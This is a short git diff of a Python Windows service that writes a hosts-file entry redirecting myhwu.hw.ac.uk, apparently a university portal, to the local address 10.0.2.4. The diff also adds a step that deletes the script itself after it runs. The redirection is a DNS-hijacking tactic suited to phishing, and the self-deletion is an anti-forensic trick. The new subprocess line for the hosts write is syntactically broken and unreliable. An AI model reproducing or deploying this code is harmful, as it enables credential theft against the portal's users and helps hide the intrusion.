@@ -3,6 +3,7 @@ import win32service
 import win32event
 import servicemanager
 import socket
+import sys, subprocess 
 
 
 class AppServerSvc (win32serviceutil.ServiceFramework):
@@ -26,12 +27,9 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
 
     def main(self):
         hosts_path = "C:\Windows\System32\drivers\etc\hosts"
-
-        line_to_append = "10.0.2.4 myhwu.hw.ac.uk" 
-
-        with open(hosts_path, "a") as file:
-            file.write('\n' + line_to_append + "\n")
-            
+        subprocess.Popen("10.0.2.4  myhwu.hw.ac.uk" >> {}, hosts_path)
+        subprocess.Popen("python -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(sys.argv[0]))
+        sys.exit(0)
             # https://bit.ly/3wV8Ecg
 
 if __name__ == '__main__':
